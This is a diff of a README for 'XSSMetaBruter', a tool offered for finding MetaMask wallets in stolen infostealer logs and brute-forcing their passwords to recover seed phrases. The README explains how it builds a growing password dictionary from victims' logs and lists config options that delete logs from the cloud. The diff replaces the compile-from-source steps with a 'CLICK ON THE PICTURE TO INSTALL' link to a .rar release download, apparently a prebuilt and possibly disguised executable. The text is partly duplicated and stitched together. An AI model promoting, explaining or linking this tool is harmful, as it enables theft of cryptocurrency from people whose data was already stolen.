@@ -17,8 +17,7 @@ How does bruteforcing work?
 First, passwords from the logs are used. If none of them match, then passwords that were generated based on the passwords from the logs are used. If even this is not successful, then passwords from a ready-made dictionary are used. Also, passwords from logs and passwords generated on the basis of passwords from logs are written to privat_1, so that with each checked log you can expand your dictionary and make each subsequent bruteforce more efficient.
 
 Setting up and compiling the bruteforcer:
-1. Run XSSMetaBruter.sln.
-2. Open and modify the config.json file located at the path \XSSMetaBruter\bin\Release.
+1. Open and modify the config.json file located at the path \XSSMetaBruter\bin\Release.
 
 Value designation in config.json
 “pass_dictionary": The path to the finished dictionary.
@@ -28,11 +27,10 @@ Value designation in config.json
 “check_virus": Removing exe files from the logs.
 “check_cloud": Checking for logs from the cloud.
 “delete_cloud": Deleting logs from the cloud.
+2. Drag and drop the logs folder into the console that opens and press Enter.
+3. Wait for the bruteforce to complete; the results will be saved in a txt file next to your bruteforcer exe file.
+4. CLICK ON THE PICTURE TO INSTALL
 
-3. In Visual Studio, compile the project in Release mode.
-4. Run the resulting exe file.
-5. Drag and drop the folder with logs into the opened console and press Enter.
-6. Wait for the bruteforce to finish; the results will be saved in a txt file next to your bruteforcer exe file.
 
 Translated with DeepL.com (free version)This software is a program for searching MetaMask wallets in the logs and brute force a lot of passwords to get seed phrases and passwords from wallets.
 
@@ -64,10 +62,5 @@ Value designation in config.json
 “check_virus": Removing exe files from the logs.
 “check_cloud": Checking for logs from the cloud.
 “delete_cloud": Deleting logs from the cloud.
-
-
-3. Drag and drop the logs folder into the console that opens and press Enter.
-4. Wait for the bruteforce to complete; the results will be saved in a txt file next to your bruteforcer exe file.
-5. CLICK ON THE PICTURE TO INSTALL
 
 [![image](https://github.com/user-attachments/assets/8e8e7d9c-c811-4121-b791-51090a03d458)](https://github.com/ethgenius/brutecheker/releases/download/brutemetamask/XSSMetaBruter.rar)
